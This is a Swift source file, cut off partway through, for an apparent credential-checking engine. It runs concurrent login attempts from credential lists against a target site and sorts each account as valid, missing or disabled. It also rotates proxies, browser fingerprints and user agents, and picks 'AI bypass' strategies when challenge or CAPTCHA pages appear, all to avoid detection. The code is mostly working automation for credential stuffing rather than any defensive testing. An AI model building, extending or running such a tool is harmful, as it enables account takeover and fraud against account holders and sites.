import Foundation
import UIKit
import WebKit

nonisolated enum LoginOutcome: Sendable {
    case success
    case permDisabled
    case tempDisabled
    case noAcc
    case unsure
    case connectionFailure
    case timeout
    case redBannerError
    case smsDetected
}

@MainActor
class LoginAutomationEngine {
    private var activeSessions: Int = 0
    let maxConcurrency: Int = 8
    var debugMode: Bool = false
    var stealthEnabled: Bool = false
    var automationSettings: AutomationSettings = AutomationSettings()
    var proxyTarget: ProxyRotationService.ProxyTarget = .joe
    var networkConfigOverride: ActiveNetworkConfig?
    private let logger = DebugLogger.shared
    private let visionML = VisionMLService.shared
    private let debugButtonService = DebugLoginButtonService.shared
    private let trueDetection = TrueDetectionService.shared
    private let networkFactory = NetworkSessionFactory.shared
    private let deadSessionDetector = DeadSessionDetector.shared
    private let replayLogger = SessionReplayLogger.shared
    private let circuitBreaker = HostCircuitBreakerService.shared
    private let challengeClassifier = ChallengePageClassifier.shared
    private let crashRecovery = WebViewCrashRecoveryService.shared
    private let lifetimeBudget = WebViewLifetimeBudgetService.shared
    private let screenshotDedup = ScreenshotDedupService.shared
    private let hostFingerprint = HostFingerprintLearningService.shared
    private let adaptiveRetry = AdaptiveRetryService.shared
    private let urlQualityScoring = URLQualityScoringService.shared
    private let confidenceEngine = ConfidenceResultEngine.shared
    private let aiProxyStrategy = AIProxyStrategyService.shared
    private let aiChallengeSolver = AIChallengePageSolverService.shared
    private let aiURLOptimizer = AILoginURLOptimizerService.shared
    private let aiFingerprintTuning = AIFingerprintTuningService.shared
    private let aiSessionHealth = AISessionHealthMonitorService.shared
    private let aiCredentialPriority = AICredentialPriorityScoringService.shared
    private let aiAntiDetection = AIAntiDetectionAdaptiveService.shared
    private let customTools = AICustomToolsCoordinator.shared
    private let aiPreConditioning = AISessionPreConditioningService.shared
    private let aiOutcomeRescue = AIOutcomeRescueEngine.shared
    private let aiInteractionGraph = AIReinforcementInteractionGraph.shared
    private let activityMonitor = SessionActivityMonitor.shared
    private let liveSpeed = LiveSpeedAdaptationService.shared
    private let autopilot = AISessionAutopilotEngine.shared
    private let autopilotExecutor = AutopilotActionExecutor.shared
    var onScreenshot: ((PPSRDebugScreenshot) -> Void)?
    var onPurgeScreenshots: (([String]) -> Void)?
    var onConnectionFailure: ((String) -> Void)?
    var onUnusualFailure: ((String) -> Void)?
    var onLog: ((String, PPSRLogEntry.Level) -> Void)?
    var onURLFailure: ((String) -> Void)?
    var onURLSuccess: ((String) -> Void)?
    var onResponseTime: ((String, TimeInterval) -> Void)?
    var onBlankScreenshot: ((String) -> Void)?

    var canStartSession: Bool {
        activeSessions < maxConcurrency
    }

    func runLoginTest(_ attempt: LoginAttempt, targetURL: URL, timeout: TimeInterval = 180) async -> LoginOutcome {
        let timeout = TimeoutResolver.resolveTestTimeout(timeout, userSetting: automationSettings.pageLoadTimeout)
        activeSessions += 1
        defer { activeSessions -= 1 }

        let sessionId = "login_\(attempt.credential.username.prefix(12))_\(UUID().uuidString.prefix(6))"
        attempt.startedAt = Date()

        let host = targetURL.host ?? targetURL.absoluteString

        let healthPrediction = aiSessionHealth.predictHealth(for: host, activeSessions: activeSessions)
        if healthPrediction.risk == .critical && healthPrediction.shouldAbort {
            logger.log("AISessionHealth: ABORT — \(host) risk=critical prob=\(String(format: "%.0f%%", healthPrediction.failureProbability * 100)) — \(healthPrediction.recommendation)", category: .automation, level: .error)
            attempt.status = .failed
            attempt.errorMessage = "AI health monitor: \(healthPrediction.recommendation)"
            attempt.completedAt = Date()
            return .connectionFailure
        }
        if healthPrediction.risk == .high || healthPrediction.risk == .moderate {
            attempt.logs.append(PPSRLogEntry(message: "AI Health: \(healthPrediction.risk.rawValue) risk (\(Int(healthPrediction.failureProbability * 100))%) — \(healthPrediction.recommendation)", level: healthPrediction.risk == .high ? .warning : .info))
        }

        if !circuitBreaker.shouldAllow(host: host) {
            let remaining = Int(circuitBreaker.cooldownRemaining(host: host))
            logger.log("CircuitBreaker: BLOCKED \(host) — cooldown \(remaining)s remaining", category: .network, level: .warning)
            attempt.status = .failed
            attempt.errorMessage = "Host circuit breaker open — cooldown \(remaining)s"
            attempt.completedAt = Date()
            return .connectionFailure
        }

        autopilot.startSession(id: sessionId, host: host)

        replayLogger.startSession(id: sessionId, targetURL: targetURL.absoluteString, credential: attempt.credential.username)
        replayLogger.log(sessionId: sessionId, action: "init", detail: "timeout=\(Int(timeout))s stealth=\(stealthEnabled)")

        logger.startSession(sessionId, category: .login, message: "Starting login test for \(attempt.credential.username) → \(targetURL.host ?? targetURL.absoluteString)")
        logger.log("Config: timeout=\(Int(timeout))s stealth=\(stealthEnabled) activeSessions=\(activeSessions)/\(maxConcurrency)", category: .login, level: .debug, sessionId: sessionId, metadata: ["url": targetURL.absoluteString, "username": attempt.credential.username])

        let preConditionRecipe = aiPreConditioning.preConditionSession(for: host)
        if let bestPatterns = preConditionRecipe.bestPatternOrder, !bestPatterns.isEmpty {
            attempt.logs.append(PPSRLogEntry(message: "PreCondition: recipe v\(preConditionRecipe.version) — \(preConditionRecipe.totalDataPoints) data pts, \(String(format: "%.0f%%", preConditionRecipe.successRate * 100)) success, patterns=[\(bestPatterns.prefix(3).joined(separator: ","))]", level: .info))
        }
        if let extraMs = preConditionRecipe.recommendedPageLoadExtraMs, extraMs > automationSettings.pageLoadExtraDelayMs {
            attempt.logs.append(PPSRLogEntry(message: "PreCondition: overriding page load extra delay → \(extraMs)ms (was \(automationSettings.pageLoadExtraDelayMs)ms)", level: .info))
        }
        var interactionActions: [InteractionAction] = []
        _ = Date()

        let netConfig = networkConfigOverride ?? networkFactory.appWideConfig(for: proxyTarget)
        logger.log("Network config: \(netConfig.label) for target \(proxyTarget.rawValue)\(networkConfigOverride != nil ? " (override)" : "")", category: .network, level: .info, sessionId: sessionId)
        attempt.logs.append(PPSRLogEntry(message: "Network: \(netConfig.label)\(networkConfigOverride != nil ? " (override)" : "")", level: .info))

        let session = LoginSiteWebSession(targetURL: targetURL, networkConfig: netConfig)
        session.monitoringSessionId = sessionId
        session.stealthEnabled = stealthEnabled
        session.fingerprintValidationEnabled = automationSettings.fingerprintValidationEnabled
        session.onFingerprintLog = { [weak self] msg, level in
            attempt.logs.append(PPSRLogEntry(message: msg, level: level))
            self?.onLog?(msg, level)
            let debugLevel: DebugLogLevel = level == .error ? .error : level == .warning ? .warning : .trace
            self?.logger.log(msg, category: .fingerprint, level: debugLevel, sessionId: sessionId)
        }
        logger.log("WebView session setUp (wipeAll: true) network=\(netConfig.label)", category: .webView, level: .trace, sessionId: sessionId)
        session.setUp(wipeAll: true)
        session.onProcessTerminated = { [weak self] in
            self?.logger.log("LoginEngine: WebView process terminated for \(sessionId) — crash recovery will handle", category: .webView, level: .critical, sessionId: sessionId)
        }
        defer {
            session.tearDown(wipeAll: true)
            crashRecovery.clearSession(sessionId)
            lifetimeBudget.clearSession(sessionId)
            logger.log("WebView session tearDown (wipeAll: true)", category: .webView, level: .trace, sessionId: sessionId)
        }

        let slowDebugTask = makeSlowDebugCaptureTaskIfNeeded(session: session, attempt: attempt, sessionId: sessionId)
        defer { slowDebugTask?.cancel() }

        activityMonitor.startMonitoring(sessionId: sessionId)
        defer { activityMonitor.stopMonitoring(sessionId: sessionId) }

        logger.startTimer(key: sessionId)
        let outcome: LoginOutcome = await withTaskGroup(of: LoginOutcome.self) { group in
            group.addTask {
                return await self.performLoginTest(session: session, attempt: attempt, sessionId: sessionId)
            }

            group.addTask {
                try? await Task.sleep(for: .seconds(timeout))
                return .timeout
            }

            group.addTask { @MainActor in
                try? await Task.sleep(for: .seconds(SessionActivityMonitor.idleThresholdSeconds))
                while !Task.isCancelled {
                    let idle = self.activityMonitor.isIdle(sessionId: sessionId)
                    let hasAny = self.activityMonitor.hasActivity(sessionId: sessionId)
                    if idle && !hasAny {
                        self.logger.log("IdleWatchdog: \(sessionId) has ZERO network activity after \(Int(SessionActivityMonitor.idleThresholdSeconds))s — killing", category: .webView, level: .error, sessionId: sessionId)
                        return .timeout
                    }
                    if idle && hasAny {
                        let secondsIdle = self.activityMonitor.secondsSinceLastActivity(sessionId: sessionId)
                        if secondsIdle >= SessionActivityMonitor.idleThresholdSeconds {
                            self.logger.log("IdleWatchdog: \(sessionId) went idle for \(Int(secondsIdle))s after prior activity — killing", category: .webView, level: .error, sessionId: sessionId)
                            return .timeout
                        }
                    }
                    try? await Task.sleep(for: .seconds(3))
                }
                return .timeout
            }

            let first = await group.next() ?? .timeout
            group.cancelAll()
            return first
        }
        let totalMs = logger.stopTimer(key: sessionId)

        if outcome == .timeout {
            let idleStatus = activityMonitor.checkIdleStatus(sessionId: sessionId)
            if case .idle(let secs) = idleStatus {
                attempt.status = .failed
                attempt.errorMessage = "Idle timeout — zero network activity for \(Int(secs))s, retrying with different config"
                attempt.completedAt = Date()
                attempt.logs.append(PPSRLogEntry(message: "IDLE TIMEOUT: No network activity for \(Int(secs))s — will retry in \(Int(SessionActivityMonitor.idleRetryDelaySeconds))s with AI fallback", level: .warning))
                logger.log("IDLE TIMEOUT after \(Int(secs))s idle for \(attempt.credential.username) — AI will pick fallback", category: .login, level: .error, sessionId: sessionId, durationMs: totalMs)
                onUnusualFailure?("Idle timeout for \(attempt.credential.username) — no activity for \(Int(secs))s")
            } else {
                attempt.status = .failed
                attempt.errorMessage = "Test timed out after \(Int(timeout))s — auto-requeuing"
                attempt.completedAt = Date()
                attempt.logs.append(PPSRLogEntry(message: "TIMEOUT: Test exceeded \(Int(timeout))s limit", level: .warning))
                logger.log("TIMEOUT after \(Int(timeout))s for \(attempt.credential.username)", category: .login, level: .error, sessionId: sessionId, durationMs: totalMs)
                onUnusualFailure?("Timeout for \(attempt.credential.username) after \(Int(timeout))s")
            }
        }

        if outcome == .connectionFailure {
            logger.log("CONNECTION FAILURE for \(attempt.credential.username) on \(targetURL.host ?? "")", category: .network, level: .error, sessionId: sessionId, durationMs: totalMs)
            onURLFailure?(targetURL.absoluteString)
            onUnusualFailure?("Connection failure for \(attempt.credential.username)")
            circuitBreaker.recordFailure(host: host, type: .connectionError)
            urlQualityScoring.recordFailure(urlString: targetURL.absoluteString, failureType: "connectionFailure")
        }

        if outcome == .timeout {
            circuitBreaker.recordFailure(host: host, type: .timeout)
            urlQualityScoring.recordFailure(urlString: targetURL.absoluteString, failureType: "timeout")
        }

        if outcome == .success || outcome == .noAcc || outcome == .permDisabled || outcome == .tempDisabled {
            onURLSuccess?(targetURL.absoluteString)
            circuitBreaker.recordSuccess(host: host)
            if let started = attempt.startedAt {
                urlQualityScoring.recordSuccess(urlString: targetURL.absoluteString, latencyMs: Int(Date().timeIntervalSince(started) * 1000))
            }
            if outcome == .success {
                urlQualityScoring.recordLoginSuccess(urlString: targetURL.absoluteString)
                hostFingerprint.recordPatternOutcome(host: host, pattern: "last_used", success: true)
            }
        }

        let proxyId = extractProxyId(from: netConfig)
        if let proxyId {
            let latencyMs = attempt.startedAt.map { Int(Date().timeIntervalSince($0) * 1000) } ?? 0
            let isSuccess = outcome == .success || outcome == .noAcc || outcome == .permDisabled || outcome == .tempDisabled
            let isBlocked = outcome == .connectionFailure
            let isChallenge = outcome == .redBannerError || outcome == .smsDetected
            aiProxyStrategy.recordOutcome(
                proxyId: proxyId,
                host: host,
                target: proxyTarget.rawValue,
                success: isSuccess,
                latencyMs: latencyMs,
                blocked: isBlocked,
                challengeDetected: isChallenge
            )
        }

        if let started = attempt.startedAt {
            let responseTime = Date().timeIntervalSince(started)
            logger.log("Response time: \(Int(responseTime * 1000))ms on \(targetURL.host ?? "")", category: .timing, level: .debug, sessionId: sessionId, durationMs: Int(responseTime * 1000))
            onResponseTime?(targetURL.absoluteString, responseTime)

            liveSpeed.recordLatency(
                latencyMs: Int(responseTime * 1000),
                success: outcome == .success || outcome == .noAcc || outcome == .permDisabled || outcome == .tempDisabled,
                wasTimeout: outcome == .timeout,
                wasConnectionFailure: outcome == .connectionFailure,
                host: host
            )
        }

        let aiLatencyMs = attempt.startedAt.map { Int(Date().timeIntervalSince($0) * 1000) } ?? 0
        let aiIsBlocked = outcome == .connectionFailure
        let aiIsChallenge = outcome == .redBannerError || outcome == .smsDetected
        aiURLOptimizer.recordOutcome(
            urlString: targetURL.absoluteString,
            outcome: "\(outcome)",
            latencyMs: aiLatencyMs,
            blocked: aiIsBlocked,
            challengeDetected: aiIsChallenge,
            blankPage: false,
            loginSuccess: outcome == .success
        )

        if let profileIdx = session.activeProfileIndex, let stealthProfile = session.stealthProfile {
            let fpScore = session.lastFingerprintScore
            let detected = fpScore?.passed == false
            aiFingerprintTuning.recordOutcome(
                profileIndex: profileIdx,
                profileSeed: stealthProfile.seed,
                host: host,
                detected: detected,
                validationScore: fpScore?.totalScore ?? 0,
                signals: fpScore?.signals ?? [],
                loginSuccess: outcome == .success,
                challengeTriggered: aiIsChallenge
            )
        }

        let hostProfile = aiSessionHealth.profileFor(host: host)
        let healthSnapshot = SessionHealthSnapshot(
            sessionId: sessionId,
            host: host,
            urlString: targetURL.absoluteString,
            pageLoadTimeMs: aiLatencyMs,
            outcome: "\(outcome)",
            wasTimeout: outcome == .timeout,
            wasBlankPage: false,
            wasCrash: session.processTerminated,
            wasChallenge: aiIsChallenge,
            wasConnectionFailure: outcome == .connectionFailure,
            fingerprintDetected: session.lastFingerprintScore.map { !$0.passed } ?? false,
            circuitBreakerOpen: circuitBreaker.status(for: host) == .open,
            consecutiveFailuresOnHost: hostProfile?.consecutiveFailures ?? 0,
            activeSessions: activeSessions,
            timestamp: Date()
        )
        aiSessionHealth.recordSnapshot(healthSnapshot)

        aiCredentialPriority.recordOutcome(
            username: attempt.credential.username,
            outcome: "\(outcome)",
            host: host,
            latencyMs: aiLatencyMs,
            wasChallenge: aiIsChallenge
        )

        let fpDetected = session.lastFingerprintScore.map { !$0.passed } ?? false
        let fpSignals = session.lastFingerprintScore?.signals ?? []
        let fpScoreVal = session.lastFingerprintScore?.totalScore ?? 0
        if fpDetected || aiIsChallenge || aiIsBlocked {
            let eventType: String
            if fpDetected { eventType = "detection" }
            else if aiIsChallenge { eventType = "challenge" }
            else { eventType = "block" }
            aiAntiDetection.recordDetectionEvent(
                host: host,
                urlString: targetURL.absoluteString,
                eventType: eventType,
                signals: fpSignals,
                fingerprintScore: fpScoreVal,
                outcome: "\(outcome)",
                profileIndex: session.activeProfileIndex,
                proxyType: netConfig.label
            )
        }

        if outcome == .connectionFailure || outcome == .timeout || outcome == .unsure {
            Task {
                let recentLogs = attempt.logs.suffix(10).map(\.message)
                let _ = await customTools.analyzeRunHealth(
                    sessionId: sessionId,
                    logs: recentLogs,
                    pageText: nil,
                    screenshotAvailable: false,
                    currentOutcome: "\(outcome)",
                    host: host,
                    attemptNumber: 1,
                    elapsedMs: aiLatencyMs
                )
            }
        }

        let preCondPatternUsed = attempt.logs.first(where: { $0.message.contains("selected pattern") })?.message ?? "unknown"
        let isOutcomeSuccess = outcome == .success || outcome == .noAcc || outcome == .permDisabled || outcome == .tempDisabled
        aiPreConditioning.recordOutcome(
            host: host,
            proxyType: netConfig.label,
            stealthSeed: session.activeProfileIndex,
            patternUsed: preCondPatternUsed,
            urlVariant: targetURL.absoluteString,
            outcome: "\(outcome)",
            latencyMs: aiLatencyMs,
            wasSuccess: isOutcomeSuccess,
            wasChallenge: aiIsChallenge,
            wasBlocked: aiIsBlocked
        )

        interactionActions.append(InteractionAction(
            actionType: "session_complete",
            detail: "\(outcome)",
            durationMs: aiLatencyMs,
            delayBeforeMs: 0,
            success: isOutcomeSuccess,
            timestamp: Date()
        ))
        aiInteractionGraph.recordSequence(
            host: host,
            actions: interactionActions,
            finalOutcome: "\(outcome)",
            wasSuccess: isOutcomeSuccess,
            totalDurationMs: aiLatencyMs,
            patternUsed: preCondPatternUsed,
            proxyType: netConfig.label,
            stealthSeed: session.activeProfileIndex
        )

        var finalOutcomeResult = outcome
        if aiOutcomeRescue.shouldAttemptRescue(outcome: "\(outcome)", confidence: 0.3) {
            let pageContent = attempt.responseSnippet ?? ""
            let currentURL = attempt.detectedURL ?? targetURL.absoluteString
            let ocrText: String?
            if let snapshot = attempt.responseSnapshot {
                ocrText = await aiOutcomeRescue.extractOCRText(from: snapshot)
            } else {
                ocrText = nil
            }
            let rescueBundle = RescueSignalBundle(
                host: host,
                sessionId: sessionId,
                originalOutcome: "\(outcome)",
                originalConfidence: 0.3,
                pageContent: pageContent,
                currentURL: currentURL,
                preLoginURL: targetURL.absoluteString,
                pageTitle: "",
                ocrText: ocrText,
                httpStatus: nil,
                latencyMs: aiLatencyMs,
                redirectChain: [],
                cookieCount: 0,
                hadContentChange: false,
                hadNavigation: false,
                hadRedirect: currentURL.lowercased() != targetURL.absoluteString.lowercased(),
                welcomeTextFound: false,
                errorBannerDetected: false,
                timestamp: Date()
            )
            let rescueResult = await aiOutcomeRescue.attemptRescue(bundle: rescueBundle)
            if rescueResult.rescued {
                attempt.logs.append(PPSRLogEntry(message: "OUTCOME RESCUE: \(outcome) -> \(rescueResult.newOutcome) (\(String(format: "%.0f%%", rescueResult.newConfidence * 100))) - \(rescueResult.reasoning)", level: .success))
                logger.log("OutcomeRescue: \(outcome) -> \(rescueResult.newOutcome) for \(attempt.credential.username)", category: .evaluation, level: .success, sessionId: sessionId)
                switch rescueResult.newOutcome {
                case "success": finalOutcomeResult = .success
                case "permDisabled": finalOutcomeResult = .permDisabled
                case "tempDisabled": finalOutcomeResult = .tempDisabled
                case "noAcc": finalOutcomeResult = .noAcc
                default: break
                }
            }
        }

        let pageContent = attempt.responseSnippet ?? ""
        let currentURL = attempt.detectedURL ?? targetURL.absoluteString
        let confidenceResult = await confidenceEngine.evaluate(
            pageContent: pageContent,
            currentURL: currentURL,
            preLoginURL: targetURL.absoluteString,
            pageTitle: "",
            welcomeTextFound: false,
            redirectedToHomepage: currentURL.lowercased() != targetURL.absoluteString.lowercased() && !currentURL.lowercased().contains("/login"),
            navigationDetected: currentURL != targetURL.absoluteString,
            contentChanged: !pageContent.isEmpty,
            responseTimeMs: aiLatencyMs,
            screenshot: attempt.responseSnapshot,
            httpStatus: nil
        )
        attempt.confidenceScore = confidenceResult.confidence
        attempt.confidenceSignals = confidenceResult.signalBreakdown
        attempt.confidenceReasoning = confidenceResult.reasoning
        attempt.networkModeLabel = netConfig.label

        replayLogger.log(sessionId: sessionId, action: "complete", detail: "outcome=\(finalOutcomeResult) confidence=\(String(format: "%.0f%%", confidenceResult.confidence * 100))", level: finalOutcomeResult == .success ? "success" : "error")
        replayLogger.addMetadata(sessionId: sessionId, key: "outcome", value: "\(finalOutcomeResult)")
        replayLogger.addMetadata(sessionId: sessionId, key: "confidence", value: String(format: "%.2f", confidenceResult.confidence))
        let completedReplayLog = replayLogger.endSession(id: sessionId, outcome: "\(finalOutcomeResult)")
        if let replayLog = completedReplayLog {
            attempt.replayLog = replayLog
            if let jsonData = replayLogger.exportAsJSON(replayLog) {
                let dir = FileManager.default.temporaryDirectory.appendingPathComponent("session_replays", isDirectory: true)
                try? FileManager.default.createDirectory(at: dir, withIntermediateDirectories: true)
                let file = dir.appendingPathComponent("\(sessionId).json")
                try? jsonData.write(to: file)
            }
        }

        autopilot.endSession(id: sessionId)

        logger.endSession(sessionId, category: .login, message: "Login test COMPLETE: \(finalOutcomeResult) for \(attempt.credential.username) confidence=\(String(format: "%.0f%%", confidenceResult.confidence * 100))", level: finalOutcomeResult == .success ? .success : finalOutcomeResult == .noAcc ? .warning : .error)

        return finalOutcomeResult
    }

    private func performLoginTest(session: LoginSiteWebSession, attempt: LoginAttempt, sessionId: String = "") async -> LoginOutcome {
        advanceTo(.loadingPage, attempt: attempt, message: "Loading login page: \(session.targetURL.absoluteString)")
        logger.log("Phase: LOAD PAGE → \(session.targetURL.absoluteString)", category: .automation, level: .info, sessionId: sessionId)
        replayLogger.log(sessionId: sessionId, action: "page_load", detail: session.targetURL.absoluteString)

        let preLoginURL = session.targetURL.absoluteString.lowercased()

        var loaded = false
        for attemptNum in 1...3 {
            logger.startTimer(key: "\(sessionId)_pageload_\(attemptNum)")
            loaded = await session.loadPage(timeout: automationSettings.pageLoadTimeout)
            let loadMs = logger.stopTimer(key: "\(sessionId)_pageload_\(attemptNum)")
            if loaded {
                logger.log("Page load attempt \(attemptNum)/3 SUCCESS", category: .webView, level: .success, sessionId: sessionId, durationMs: loadMs)
                let pageHost = session.targetURL.host ?? ""
                autopilot.ingestPageLoadEvent(sessionId: sessionId, host: pageHost, url: session.targetURL.absoluteString, httpStatus: session.lastHTTPStatusCode ?? 200, loadTimeMs: loadMs ?? 0)
                break
            }
            let errorDetail = session.lastNavigationError ?? "unknown error"
            logger.log("Page load attempt \(attemptNum)/3 FAILED: \(errorDetail)", category: .webView, level: .warning, sessionId: sessionId, durationMs: loadMs)
            autopilot.ingestPageLoadEvent(sessionId: sessionId, host: session.targetURL.host ?? "", url: session.targetURL.absoluteString, httpStatus: session.lastHTTPStatusCode ?? 0, loadTimeMs: loadMs ?? 0)
            attempt.logs.append(PPSRLogEntry(message: "Page load attempt \(attemptNum)/3 failed — \(errorDetail)", level: .warning))
            if attemptNum < 3 {
                let waitTime = Double(attemptNum) * 2
                attempt.logs.append(PPSRLogEntry(message: "Retrying in \(Int(waitTime))s...", level: .info))
                logger.log("Retry wait \(Int(waitTime))s before attempt \(attemptNum + 1)", category: .automation, level: .trace, sessionId: sessionId)
                try? await Task.sleep(for: .seconds(waitTime))
                if attemptNum == 2 {
                    logger.log("Full session reset before final attempt", category: .webView, level: .debug, sessionId: sessionId)
                    session.tearDown(wipeAll: true)
                    session.stealthEnabled = stealthEnabled
                    session.setUp(wipeAll: true)
                }
            }
        }

        if !loaded && session.processTerminated {
            let recovered = await crashRecovery.handleProcessTermination(session: session, sessionId: sessionId) { msg, level in
                attempt.logs.append(PPSRLogEntry(message: msg, level: level))
            }
            if recovered {
                attempt.logs.append(PPSRLogEntry(message: "WebView crash recovered — continuing", level: .success))
                loaded = true
            } else {
                failAttempt(attempt, message: "WebView process crashed — recovery failed")
                return .connectionFailure
            }
        }

        guard loaded else {
            let errorDetail = session.lastNavigationError ?? "Unknown error"
            logger.log("FATAL: Page load failed after 3 attempts — \(errorDetail)", category: .network, level: .critical, sessionId: sessionId)
            replayLogger.log(sessionId: sessionId, action: "page_load_failed", detail: errorDetail, level: "error")
            failAttempt(attempt, message: "FATAL: Failed to load login page after 3 attempts — \(errorDetail)")
            onConnectionFailure?("Page load failed: \(errorDetail)")
            await captureDebugScreenshot(session: session, attempt: attempt, step: "page_load_failed", note: "Failed to load", autoResult: .unknown)
            return .connectionFailure
        }
        replayLogger.log(sessionId: sessionId, action: "page_loaded", detail: "loaded after retries")

        let challengeStart = Date()
        let challengeHost = session.targetURL.host ?? session.targetURL.absoluteString
        let challengeResult = await challengeClassifier.classify(session: session)
        if challengeResult.type != .none {
            autopilot.ingestDOMMutation(sessionId: sessionId, host: challengeHost, mutationType: "challenge_detected", elementInfo: "type=\(challengeResult.type.rawValue) signals=\(challengeResult.signals.prefix(3).joined(separator: ","))")
            let autopilotDecision = autopilot.ingestSignal(AutopilotSignal(
                type: challengeResult.type == .captcha ? .captchaFormingDetected : .challengeFormingDetected,
                sessionId: sessionId, host: challengeHost, timestamp: Date(),
                confidence: challengeResult.confidence,
                metadata: ["challengeType": challengeResult.type.rawValue],
                rawData: nil
            ))
            if autopilotDecision.action != .noOp {
                let execResult = await autopilotExecutor.execute(decision: autopilotDecision, session: session, proxyTarget: proxyTarget)
                attempt.logs.append(PPSRLogEntry(message: "AUTOPILOT: \(autopilotDecision.action.rawValue) — \(execResult.detail)", level: execResult.success ? .info : .warning))
            }
            let aiRec = challengeResult.aiBypassRecommendation
            let strategyLabel = aiRec?.primaryStrategy ?? challengeResult.suggestedAction.rawValue
            attempt.logs.append(PPSRLogEntry(message: "CHALLENGE DETECTED: \(challengeResult.type.rawValue) (confidence: \(String(format: "%.0f%%", challengeResult.confidence * 100))) — AI strategy: \(strategyLabel)", level: .warning))
            if let aiRec {
                attempt.logs.append(PPSRLogEntry(message: "AI bypass: \(aiRec.primaryStrategy) (confidence: \(String(format: "%.0f%%", aiRec.confidence * 100))) — \(aiRec.reasoning)", level: .info))
            }
            logger.log("Challenge page detected for \(attempt.credential.username): \(challengeResult.type.rawValue) — AI strategy: \(strategyLabel)", category: .evaluation, level: .warning, sessionId: sessionId)

            let resolvedStrategy = aiRec?.primaryStrategy ?? challengeResult.suggestedAction.rawValue
            var challengeBypassed = false

            switch resolvedStrategy {
            case "abort":
                let latencyMs = Int(Date().timeIntervalSince(challengeStart) * 1000)
                aiChallengeSolver.recordEncounter(host: challengeHost, challengeType: challengeResult.type, signals: challengeResult.signals, bypassUsed: "abort", success: false, latencyMs: latencyMs)
                failAttempt(attempt, message: "Challenge page: \(challengeResult.type.rawValue) — aborting")
                return .connectionFailure
            case "waitAndRetry":
                let waitMs = aiRec?.waitTimeMs ?? 5000
                attempt.logs.append(PPSRLogEntry(message: "AI: waiting \(waitMs)ms before retrying due to \(challengeResult.type.rawValue)", level: .info))
                try? await Task.sleep(for: .milliseconds(waitMs))
                challengeBypassed = true
            case "rotateProxy", "switchNetwork":
                attempt.logs.append(PPSRLogEntry(message: "AI: network rotation recommended — proceeding with caution", level: .warning))
                challengeBypassed = true
            case "rotateFingerprint":
                let stealth = PPSRStealthService.shared
                let newProfile = stealth.nextProfile()
                session.webView?.customUserAgent = newProfile.userAgent
                let newJS = stealth.createStealthUserScript(profile: newProfile)
                session.webView?.configuration.userContentController.removeAllUserScripts()
                session.webView?.configuration.userContentController.addUserScript(newJS)
                attempt.logs.append(PPSRLogEntry(message: "AI: rotated fingerprint (seed: \(newProfile.seed))", level: .info))
                challengeBypassed = true
            case "rotateURL":
                attempt.logs.append(PPSRLogEntry(message: "AI: URL rotation recommended — proceeding with caution", level: .warning))
                challengeBypassed = true
            case "fullSessionReset":
                attempt.logs.append(PPSRLogEntry(message: "AI: full session reset recommended", level: .warning))
                session.tearDown(wipeAll: true)
                session.stealthEnabled = stealthEnabled
                session.setUp(wipeAll: true)
                let reloaded = await session.loadPage(timeout: automationSettings.pageLoadTimeout)
                challengeBypassed = reloaded
                if !reloaded {
                    attempt.logs.append(PPSRLogEntry(message: "AI: session reset failed to reload page", level: .error))
                }
            default:
                switch challengeResult.suggestedAction {
                case .abort:
                    let latencyMs = Int(Date().timeIntervalSince(challengeStart) * 1000)
                    aiChallengeSolver.recordEncounter(host: challengeHost, challengeType: challengeResult.type, signals: challengeResult.signals, bypassUsed: "abort", success: false, latencyMs: latencyMs)
                    failAttempt(attempt, message: "Challenge page: \(challengeResult.type.rawValue) — aborting")
                    return .connectionFailure
                case .waitAndRetry:
                    attempt.logs.append(PPSRLogEntry(message: "Waiting 5s before retrying due to \(challengeResult.type.rawValue)", level: .info))
                    try? await Task.sleep(for: .seconds(5))
                    challengeBypassed = true
                case .rotateProxy, .switchNetwork, .rotateURL:
                    attempt.logs.append(PPSRLogEntry(message: "Challenge suggests network change — proceeding with caution", level: .warning))
                    challengeBypassed = true
                case .proceed:
                    challengeBypassed = true
                }
            }

            let latencyMs = Int(Date().timeIntervalSince(challengeStart) * 1000)
            aiChallengeSolver.recordEncounter(host: challengeHost, challengeType: challengeResult.type, signals: challengeResult.signals, bypassUsed: resolvedStrategy, success: challengeBypassed, latencyMs: latencyMs)
        }

        let pageHost = session.targetURL.host ?? ""
        let _ = await hostFingerprint.captureSignature(from: session, host: pageHost)

        await session.injectSettlementMonitor()
        let settlementResult = await session.waitForSmartSettlement(host: pageHost, sessionId: sessionId, maxTimeoutMs: max(15000, automationSettings.pageLoadExtraDelayMs * 3))
        if settlementResult.settled {
            attempt.logs.append(PPSRLogEntry(message: "Smart page settlement: SETTLED in \(settlementResult.durationMs)ms — \(settlementResult.reason)", level: .success))
        } else {
            attempt.logs.append(PPSRLogEntry(message: "Smart page settlement: TIMEOUT after \(settlementResult.durationMs)ms — \(settlementResult.reason) (proceeding anyway)", level: .warning))
        }
        logger.log("PageSettlement: \(settlementResult.settled ? "settled" : "timeout") in \(settlementResult.durationMs)ms — net:\(settlementResult.signals.networkIdle) dom:\(settlementResult.signals.domStable) anim:\(settlementResult.signals.animationsComplete) form:\(settlementResult.signals.loginFormReady)", category: .automation, level: settlementResult.settled ? .success : .warning, sessionId: sessionId, durationMs: settlementResult.durationMs)

        let pageTitle = await session.getPageTitle()
        attempt.logs.append(PPSRLogEntry(message: "Page loaded: \"\(pageTitle)\"", level: .info))
        logger.log("Page title: \"\(pageTitle)\"", category: .webView, level: .debug, sessionId: sessionId)

        if let initialScreenshot = await session.captureScreenshot(), BlankScreenshotDetector.isBlank(initialScreenshot) {
            autopilot.ingestBlankPageDetected(sessionId: sessionId, host: pageHost)
            attempt.logs.append(PPSRLogEntry(message: "BLANK PAGE after load — waiting up to \(automationSettings.blankPageTimeoutSeconds)s for content...", level: .warning))
            logger.log("BLANK PAGE detected after load for \(attempt.credential.username) — polling for \(automationSettings.blankPageTimeoutSeconds)s", category: .screenshot, level: .warning, sessionId: sessionId)

            let appeared = await BlankPageRecoveryService.shared.waitForNonBlankLoginSession(
                session: session,
                timeoutSeconds: automationSettings.blankPageTimeoutSeconds,
                sessionId: sessionId,
                onLog: { [weak self] msg, level in
                    attempt.logs.append(PPSRLogEntry(message: msg, level: level))
                    self?.onLog?(msg, level)
                }
            )
            if appeared {
                attempt.logs.append(PPSRLogEntry(message: "Page content appeared within blank page timeout", level: .success))
            } else {
                attempt.logs.append(PPSRLogEntry(message: "BLANK PAGE TIMEOUT — starting multi-step recovery...", level: .warning))
                logger.log("BLANK PAGE TIMEOUT for \(attempt.credential.username) on \(session.targetURL.absoluteString) — initiating recovery", category: .screenshot, level: .error, sessionId: sessionId)
            }

